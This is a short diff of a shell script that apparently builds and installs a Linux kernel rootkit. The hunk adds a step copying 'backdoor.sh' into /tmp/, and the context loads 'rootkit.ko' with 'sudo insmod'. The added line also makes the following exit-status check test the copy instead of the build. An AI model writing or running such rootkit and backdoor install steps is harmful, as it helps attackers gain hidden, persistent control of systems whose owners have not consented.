@@ -10,6 +10,8 @@ fi
 
 make
 
+cp backdoor.sh /tmp/
+
 if [ $? -eq 0 ]; then
 	sudo insmod rootkit.ko
 
